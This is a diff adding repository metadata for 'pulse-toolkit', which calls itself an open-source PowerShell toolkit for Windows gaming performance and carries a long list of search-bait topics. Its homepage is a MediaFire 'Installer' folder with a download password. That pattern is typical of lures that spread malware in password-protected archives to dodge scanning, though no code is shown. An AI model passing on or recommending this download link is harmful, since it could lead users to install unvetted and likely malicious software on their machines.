@@ -1,0 +1,31 @@
+{
+  "name": "pulse-toolkit",
+  "description": "Pulse Toolkit - a focused Windows gaming toolkit: temp cleanup, performance power plan, network refresh, system report and game priority. PowerShell, reversible, no registry debloat.",
+  "homepage": "https://www.mediafire.com/folder/xpuwhpaw2jpbi/Installer",
+  "download_password": "5139237619",
+  "private": false,
+  "has_discussions": true,
+  "has_issues": true,
+  "topics": [
+    "windows",
+    "windows-11",
+    "windows-10",
+    "powershell",
+    "gaming",
+    "performance",
+    "optimization",
+    "system-tools",
+    "pc-gaming",
+    "fps",
+    "network",
+    "dns",
+    "power-plan",
+    "maintenance",
+    "cleanup",
+    "toolkit",
+    "open-source",
+    "cli",
+    "sysadmin",
+    "pulse"
+  ]
+}
